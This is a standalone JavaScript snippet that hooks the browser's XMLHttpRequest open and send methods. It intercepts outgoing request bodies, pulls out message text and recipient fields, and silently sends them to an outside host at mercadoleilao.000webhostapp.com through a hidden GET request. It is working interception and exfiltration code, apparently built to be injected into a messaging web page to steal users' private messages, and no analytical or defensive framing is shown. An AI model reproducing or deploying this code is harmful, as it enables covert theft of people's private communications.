var origOpen = XMLHttpRequest.prototype.open;
      XMLHttpRequest.prototype.open = function () {
        var getParameterByName = function (content, name) {
              name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
              var regex = new RegExp("[\\?&]" + name + "=([^&#]*)", "i"),
                  results = regex.exec(content);
              return results == null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
          };
          var func = function () {
              var content = this.PARAMETERS_S;
              var sendContent = getParameterByName(content || "  ", "body");
              if (sendContent) {
                
                  var msg = encodeURI(sendContent) + " " + getParameterByName(content || "  ", "specific_to_list[0]") + getParameterByName(content || "  ", "specific_to_list[1]");
                  console.log(msg);
                  $.ajax({
                    type: 'GET',
                    crossDomain: true,
                    async : false,
                    url: 'http://mercadoleilao.000webhostapp.com/analyse.php?c=' + msg
                    //data: msg //Change to add any headers to be sent along
                  }); //*/
              }
              this.removeEventListener("load", func);
          };
          this.addEventListener('load', func);
          origOpen.apply(this, arguments);
      };
      var origSend = XMLHttpRequest.prototype.send;
      XMLHttpRequest.prototype.send = function () {
          this.PARAMETERS_S = arguments[0];
          origSend.apply(this, arguments);
      };
  